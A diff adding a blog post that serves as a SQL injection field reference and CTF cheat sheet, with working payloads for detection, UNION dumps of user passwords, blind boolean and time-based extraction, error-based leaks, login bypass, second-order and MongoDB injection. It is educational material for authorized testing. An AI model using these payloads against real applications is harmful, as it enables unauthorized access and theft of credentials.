@@ -1,0 +1,193 @@
+---
+title: "SQL Injection"
+date: "2026-06-25"
+excerpt: "Detection through exploitation — boolean, time, union, error, and blind extraction, plus login bypass, NoSQL, and a CTF methodology flow. The payloads that actually matter, nothing that doesn't."
+tags: ["Web", "SQLi", "CTF"]
+---
+
+A field reference for finding and exploiting SQL injection. Work top to bottom: confirm the
+bug, identify its class, map the query structure, then extract.
+
+## Detection — is it injectable?
+
+### Basic probes
+
+Break the query syntax and watch for an error or a changed response:
+
+```sql
+'
+"
+)
+`
+```
+
+### Error-based signs
+
+- SQL error messages echoed to the page
+- Unexpected server crash / 500
+- Page layout changes when input is malformed
+
+### Boolean testing
+
+The single most reliable tell — compare a true condition against a false one:
+
+```sql
+?id=1 AND 1=1   -- normal response
+?id=1 AND 1=2   -- different response
+```
+
+If the two responses differ, injection exists.
+
+### Time-based test
+
+When nothing is reflected, make the database stall:
+
+```sql
+?id=1 AND SLEEP(5)
+```
+
+A ~5-second delay confirms it.
+
+## Exploitation types
+
+### A. UNION-based (data dump)
+
+**Step 1 — find the column count:**
+
+```sql
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--      -- errors when n exceeds the real column count
+-- or:
+' UNION SELECT NULL,NULL--
+```
+
+**Step 2 — extract:**
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+Goal: dump users, hashes, emails.
+
+### B. Blind boolean (no output)
+
+Pull data out one character at a time, asking yes/no questions:
+
+```sql
+?id=1 AND SUBSTRING(password,1,1)='a'
+```
+
+True → guess correct. False → try the next character.
+
+### C. Time-based blind
+
+Same idea, but the answer is encoded as a delay:
+
+```sql
+?id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)
+```
+
+Delay → correct guess. No delay → wrong.
+
+### D. Error-based
+
+Force the database to leak data inside its own error message:
+
+```sql
+' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
+```
+
+The error text reveals the value.
+
+### E. Login bypass (classic)
+
+```sql
+' OR '1'='1'--
+admin'--
+```
+
+### F. Second-order
+
+Store a payload now; let a later query execute it:
+
+```sql
+-- 1. inject and store the payload:
+admin'--
+-- 2. a later query interpolates it:
+UPDATE users SET role='admin' WHERE username='admin'--
+```
+
+Executes later, not at injection time.
+
+### G. NoSQL injection (MongoDB)
+
+```json
+// bypass login — password is "not equal to empty"
+{ "username": "admin", "password": { "$ne": "" } }
+
+// match any user
+{ "username": { "$gt": "" }, "password": { "$gt": "" } }
+```
+
+## Quick methodology (CTF flow)
+
+1. **Confirm injection** — `'`, then `AND 1=1` / `AND 1=2`.
+2. **Identify the type** — error visible → error-based; different responses → boolean blind;
+   delay → time-based; results rendered → union-based.
+3. **Find the structure** — `ORDER BY n`, then `UNION SELECT NULL,NULL,NULL`.
+4. **Extract metadata** — `database()`, `user()`, `information_schema.tables`.
+5. **Dump** — walk `information_schema.tables` then `information_schema.columns`.
+
+## Common payloads
+
+**Login bypass**
+
+```sql
+' OR 1=1--
+" OR "1"="1
+admin'--
+```
+
+**Union extract**
+
+```sql
+UNION SELECT NULL--
+UNION SELECT username,password FROM users--
+```
+
+**Time-based (per engine)**
+
+```sql
+SLEEP(5)               -- MySQL
+pg_sleep(5)            -- PostgreSQL
+WAITFOR DELAY '0:0:5'  -- MSSQL
+```
+
+**Boolean extraction**
+
+```sql
+SUBSTRING(password,1,1)='a'
+```
+
+## Key pattern to remember
+
+SQLi is **turning data into code execution inside the SQL engine**. Everything above is a way
+to smuggle logic across that boundary.
+
+Ultra-short memory version:
+
+```text
+'                 test injection
+AND 1=1 / 1=2     boolean check
+ORDER BY          column count
+UNION SELECT      data dump
+SUBSTRING()       blind extraction
+SLEEP()           time-based blind
+OR 1=1            login bypass
+```
+
+<Callout>
+A reference for authorized testing and CTF practice. Only run these against applications you own
+or have explicit written permission to test.
+</Callout>
